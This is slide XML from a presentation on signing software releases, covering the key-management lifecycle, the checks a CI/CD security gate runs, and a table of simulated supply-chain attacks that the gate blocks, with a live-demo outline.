        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="key_management.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="1622830"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3291840"/>
            <a:ext cx="269748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336499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Generation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3721608"/>
            <a:ext cx="2514600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ed25519 from OS CSPRNG; key_id = SHA-256(pubkey)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="3291840"/>
            <a:ext cx="269748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3310128" y="336499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Protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3721608"/>
            <a:ext cx="2514600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AES-256 encrypted PKCS#8, 0600 → HSM / cloud KMS in production</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="3291840"/>
            <a:ext cx="269748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6144768" y="336499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Distribution</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3721608"/>
            <a:ext cx="2514600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Release keys in root-signed trust policy; root key pinned</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rounded Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4754880"/>
            <a:ext cx="269748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475488" y="482803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Rotation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="5184648"/>
            <a:ext cx="2514600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Old key → retired (valid for older releases), new key → active</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rounded Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4754880"/>
            <a:ext cx="269748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3310128" y="482803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Revocation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5184648"/>
            <a:ext cx="2514600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Key revoked + destroyed; everything it signed is rejected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rounded Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="4754880"/>
            <a:ext cx="2697480" cy="13258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6144768" y="4828032"/>
            <a:ext cx="246888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Audit</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="5184648"/>
            <a:ext cx="2514600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Every generate / rotate / revoke / sign (and denied attempt) logged</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CI/CD Security Gate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="pipeline_gate.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1325880"/>
            <a:ext cx="8046720" cy="2039643"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="3429000"/>
          <a:ext cx="8412479" cy="2304288"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="274320"/>
                <a:gridCol w="1965960"/>
                <a:gridCol w="1965960"/>
                <a:gridCol w="320040"/>
                <a:gridCol w="1874519"/>
                <a:gridCol w="2011680"/>
              </a:tblGrid>
              <a:tr h="384048">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a: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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Check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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Blocks with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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a: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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Check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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Blocks with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384048">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>1</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Trust policy (root sig, expiry)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INVALID_TRUST_POLICY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6</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SHA-256 recomputed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HASH_MISMATCH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84048">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>2</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Manifest schema</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INVALID_MANIFEST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7</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Artifact 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INVALID_SIGNATURE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84048">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3</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Signer in trust policy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UNAUTHORIZED_KEY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8</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Version revoked / rollback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REVOKED / REPLAY_BLOCKED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84048">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>4</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Key status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REVOKED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9</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Provenance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INVALID_PROVENANCE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84048">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>5</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Manifest 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INVALID_SIGNATURE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10</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Policy + content scan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POLICY_VIOLATION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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5852160"/>
            <a:ext cx="8412480" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python -m ci.security_gate verify ...   →   exit 0 = DEPLOY  ·  exit 1 = BLOCK</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Attack Simulation &amp; Live Demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1371600"/>
          <a:ext cx="5623560" cy="4389120"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="685800"/>
                <a:gridCol w="2697480"/>
                <a:gridCol w="2240280"/>
              </a:tblGrid>
              <a:tr h="365760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Scenario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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attacker action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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Gate result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365760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>1</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Legitimate release v1.0.0</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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>DEPLOY  ·  PASS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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>2</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Codecov-style line added after signing</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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  HASH_MISMATCH</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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>2b</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…and SHA-256 in manifest replaced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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  INVALID_SIGNATURE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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3a</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Re-signed with attacker's own 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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  UNAUTHORIZED_KEY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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3b</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Attacker claims vendor key ID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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  INVALID_SIGNATURE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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3d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Developer (no role) tries to sign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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  UNAUTHORIZED_SIGNER</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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3c (i)</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Stolen real key signs payload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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  POLICY_VIOLATION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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3c (ii)</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…after the key is revoked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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  REVOKED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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>4b</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Replay revoked old version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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  REVOKED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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>5</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Registry edits trust policy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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCK  ·  INVALID_TRUST_POLICY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65760">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1050" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>6</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Legitimate release restored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050" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>DEPLOY  ·  PASS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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1371600"/>
            <a:ext cx="2606040" cy="438912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6281928" y="1426464"/>
            <a:ext cx="2423160" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5-minute live demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="1783080"/>
            <a:ext cx="2423160" cy="3566160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. Show architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2. Build, hash, sign v1.0.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3. Download over TLS 1.3 → PASS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4. Inject 1 line after signing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5. SHA-256 mismatch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>6. Signature failure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>7. Gate BLOCKS + event</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>8. Audit log (chain intact)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>9. Revoke key</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>10. New release → PASS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="5230368"/>
            <a:ext cx="2423160" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
